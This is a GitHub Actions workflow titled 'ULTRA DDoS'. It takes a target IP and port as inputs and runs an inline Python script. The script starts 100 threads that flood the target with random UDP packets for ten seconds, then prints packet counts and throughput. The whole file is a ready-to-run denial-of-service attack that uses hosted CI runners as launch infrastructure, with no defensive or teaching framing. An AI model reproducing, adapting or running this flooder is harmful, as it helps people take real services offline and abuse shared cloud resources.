name: "⚡ ULTRA DDoS"
on:
  workflow_dispatch:
    inputs:
      ip:
        description: "Target IP"
        default: "1.1.1.1"
      port:
        description: "Target Port"
        default: "80"

jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
      - name: "🚀 LAUNCH ATTACK"
        run: "python3 -c \"import socket,os,time,threading;t='${{ github.event.inputs.ip }}';p=${{ github.event.inputs.port }};print('🚀 ULTRA DDoS STARTING');print(f'🎯 {t}:{p}');print('⚡ 1444 Mbps MAX SPEED');c=0;b=0;start=time.time();def f():global c,b;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);pk=os.urandom(1444);e=time.time()+10;while time.time()<e:for _ in range(50):s.sendto(pk,(t,int(p)));c+=1;b+=1444;s.close();ts=[threading.Thread(target=f) for _ in range(100)];[x.start() for x in ts];[x.join() for x in ts];tt=time.time()-start;mb=(b*8)/(tt*1000000);print(f'✅ ATTACK COMPLETE');print(f'📦 PACKETS: {c:,}');print(f'⚡ SPEED: {mb:,.0f} Mbps');print(f'🔥 PEAK: 1444 Mbps')\""
